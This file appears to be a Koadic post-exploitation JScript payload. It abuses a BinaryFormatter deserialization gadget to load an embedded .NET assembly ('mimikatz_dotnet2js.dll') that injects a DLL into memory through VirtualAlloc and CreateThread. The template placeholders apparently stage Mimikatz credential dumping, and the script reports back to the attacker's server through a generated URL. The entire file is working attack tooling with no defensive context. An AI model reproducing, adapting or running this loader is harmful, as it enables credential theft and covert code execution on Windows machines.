function setversion() {
var shell = new ActiveXObject('WScript.Shell');
ver = 'v4.0.30319';
try {
shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
} catch(e) {
ver = 'v2.0.50727';
}
shell.Environment('Process')('COMPLUS_Version') = ver;

}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABAAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAgYeYWgAAAAAA"+
"AAAA4AACIQsBCAAACAAAAAYAAAAAAAB+JgAAACAAAABAAAAAAEAAACAAAAACAAAEAAAAAAAAAAQA"+
"AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAALCYA"+
"AE8AAAAAQAAA0AIAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"+
"AAAALnRleHQAAACEBgAAACAAAAAIAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAA0AIAAABA"+
"AAAABAAAAAoAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAOAAAAAAAAAAAA"+
"AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAGAmAAAAAAAASAAAAAIABQDMIAAAYAUAAAEAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKgIoBAAACgAA"+
"ACoAEzAGAGIAAAABAAARAAMoBQAACgp+BgAACgaOaSAAEAAAH0AoAwAABgsGFgcGjmkoBwAACgAS"+
"AhIBKAgAAAoFalgoCQAACgAWDQQoCgAAChMEfgYAAAoWCBEEFhIDKAQAAAYTBREFFSgFAAAGJioA"+
"AEJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAAOgBAAAjfgAAVAIAAFwCAAAjU3Ry"+
"aW5ncwAAAACwBAAACAAAACNVUwC4BAAAEAAAACNHVUlEAAAAyAQAAJgAAAAjQmxvYgAAAAAAAAAC"+
"AAABRxUCFAkAAAAA+gEzABYAAAEAAAAJAAAAAgAAAAUAAAAPAAAADAAAAAMAAAABAAAAAgAAAAMA"+
"AAABAAAAAQAAAAAACgABAAAAAAAGADsANAAGAKAAgAAGAMAAgAAGABAB8QAGADsBNAAGAFQBNAAG"+
"AGAB8QAGAIgB8QAGADYC8QAAAAAAAQAAAAAAAQABAAEAEAAhAAAABQABAAEAUCAAAAAAhhhCAAoA"+
"AQBcIAAAAACGAEgADgABAAAAAACAAJYgUgAVAAQAAAAAAIAAliBfAB0ACAAAAAAAgACRIGwAKAAO"+
"AAAAAQAkAQAAAgAuAQAAAwA0AQAAAQCoAQAAAgCyAQAAAwC5AQAABADKAQAAAQDhAQAAAgD0AQAA"+
"AwAAAgAABAAPAgAABQAbAgIABgArAgAAAQBDAgAAAgBLAhEAQgAuABkAQgAKACEAQgAzAAkAQgAK"+
"ACkAQwE+ADEAWwFEADkAaAFHADEAbQFQADEAQgBUADkAdQFZAEEAQgBoAEkAQgAKAC4ACwBtAC4A"+
"EwB2AEMAGwA4AF4AmwHUAUABBwBSAAEARgEJAF8AAgBAAQsAbAABAASAAAAAAAAAAAAAAAAAAAAA"+
"AN4AAAACAAAAAAAAAAAAAAABACsAAAAAAAAAADxNb2R1bGU+AG1pbWlrYXR6X2RvdG5ldDJqcy5k"+
"bGwAVGVzdENsYXNzAG1zY29ybGliAFN5c3RlbQBPYmplY3QALmN0b3IASW5qZWN0RExMAFZpcnR1"+
"YWxBbGxvYwBDcmVhdGVUaHJlYWQAV2FpdEZvclNpbmdsZU9iamVjdABTeXN0ZW0uUnVudGltZS5D"+
"b21waWxlclNlcnZpY2VzAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAUnVudGltZUNv"+
"bXBhdGliaWxpdHlBdHRyaWJ1dGUAbWltaWthdHpfZG90bmV0MmpzAFN5c3RlbS5SdW50aW1lLklu"+
"dGVyb3BTZXJ2aWNlcwBDb21WaXNpYmxlQXR0cmlidXRlAGRsbEJhc2U2NABwYXJhbQBvZmZzZXQA"+
"Q29udmVydABGcm9tQmFzZTY0U3RyaW5nAEludFB0cgBaZXJvAE1hcnNoYWwAQ29weQBUb0ludDY0"+
"AFN0cmluZ1RvSEdsb2JhbFVuaQBEbGxJbXBvcnRBdHRyaWJ1dGUAa2VybmVsMzIuZGxsAGxwQWRk"+
"cmVzcwBkd1NpemUAZmxBbGxvY2F0aW9uVHlwZQBmbFByb3RlY3QAS2VybmVsMzIuZGxsAGxwVGhy"+
"ZWFkQXR0cmlidXRlcwBkd1N0YWNrU2l6ZQBscFN0YXJ0QWRkcmVzcwBscFBhcmFtZXRlcgBkd0Ny"+
"ZWF0aW9uRmxhZ3MAbHBUaHJlYWRJZABPdXRBdHRyaWJ1dGUAaEhhbmRsZQBkd01pbGxpc2Vjb25k"+
"cwAAAAADIAAAAAAAUCQUIcyMMkmq8cAHLd+o2AAIt3pcVhk04IkDIAABBiADAQ4OCAcABBgYCAkJ"+
"CgAGGBgJGBgJEAkFAAIJGAkEIAEBCAQgAQECBQEAAQAABQABHQUOAgYYCAAEAR0FCBgIAyAACgQg"+
"AQEKBAABGA4JBwYdBRgYCRgYBCABAQ4IAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25U"+
"aHJvd3MBAAAAVCYAAAAAAAAAAAAAbiYAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAmAAAAAAAA"+
"AAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACBAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAA"+
"AAABAAEAAAAwAACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAAHQCAAAAAAAAAAAAAHQCNAAA"+
"AFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAAAAAAAAAAAAAAAA"+
"AAA/AAAAAAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBv"+
"AAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsATUAQAAAQBTAHQAcgBpAG4A"+
"ZwBGAGkAbABlAEkAbgBmAG8AAACwAQAAAQAwADAAMAAwADAANABiADAAAAAsAAIAAQBGAGkAbABl"+
"AEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAIAAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8A"+
"bgAAAAAAMAAuADAALgAwAC4AMAAAAFAAFwABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAbQBp"+
"AG0AaQBrAGEAdAB6AF8AZABvAHQAbgBlAHQAMgBqAHMALgBkAGwAbAAAAAAAKAACAAEATABlAGcA"+
"YQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAIAAAAFgAFwABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABl"+
"AG4AYQBtAGUAAABtAGkAbQBpAGsAYQB0AHoAXwBkAG8AdABuAGUAdAAyAGoAcwAuAGQAbABsAAAA"+
"AAA0AAgAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAwAC4AMAAuADAALgAwAAAAOAAI"+
"AAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIAcwBpAG8AbgAAADAALgAwAC4AMAAuADAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAMAAAAgDYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAQ0AAAAEAAAACRcAAAAJBgAAAAkWAAAABhoAAAAnU3lzdGVtLlJl"+
"ZmxlY3Rpb24uQXNzZW1ibHkgTG9hZChCeXRlW10pCAAAAAoL";
var entry_class = 'TestClass';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var d = fmt.Deserialize_2(stm);
	al.Add(undefined);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);

  var shim_lpParam = "~MIMICMD~~~~UUIDHEADER~~~~SHIMX64UUID~~~~MIMIX86UUID~~~~MIMIX64UUID~~~" + Koadic.work.make_url();
var base64DLL = ~SHIMX86B64~
	o.InjectDLL(base64DLL, shim_lpParam, ~SHIMX86OFFSET~);
  Koadic.work.report("Done");
} catch (e) {
  Koadic.work.error(e);
}

Koadic.exit();
